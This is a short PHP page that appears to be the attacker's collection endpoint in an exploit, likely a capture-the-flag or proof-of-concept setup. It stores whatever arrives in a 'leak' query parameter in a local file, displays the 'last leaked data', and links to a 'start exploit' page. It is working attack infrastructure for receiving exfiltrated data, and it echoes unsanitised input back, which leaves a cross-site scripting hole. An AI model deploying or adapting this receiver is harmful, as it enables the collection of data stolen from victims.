
<?php 
if(!empty($_GET['leak'])){
    echo "setting leak...";
    file_put_contents('./leak.txt',$_GET['leak']);
}
?>

<br />

<a href="/start.php">start exploit</a>

<br />
<br />

Last leaked data: 

<?php 
$LEAK = file_get_contents('./leak.txt');
echo $LEAK;
 ?>